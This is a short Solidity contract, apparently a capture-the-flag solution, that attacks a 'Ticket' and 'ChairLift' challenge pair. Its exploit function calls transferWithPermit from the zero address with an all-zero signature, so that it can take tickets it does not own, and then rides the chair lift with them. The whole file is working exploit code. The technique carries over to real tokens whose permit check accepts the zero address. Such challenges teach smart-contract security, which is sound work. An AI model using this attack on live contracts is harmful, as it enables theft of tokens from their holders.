// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ticket} from "./Ticket.sol";
import {ChairLift} from "./ChairLift.sol";

contract ChairLiftExploit {
    Ticket public immutable ticket; // Contract the player will hack
    ChairLift public immutable chairLift; // Contract the player will hack

    constructor(address _ticketAddress, address _chaitLiftAddress) {
        ticket = Ticket(_ticketAddress);
        chairLift = ChairLift(_chaitLiftAddress);
    }

    function exploit() public {
        ticket.transferWithPermit(
            address(0),
            address(this),
            10,
            block.timestamp,
            0x28,
            0x0,
            0x0
        );

        chairLift.takeRide(10);
    }
}
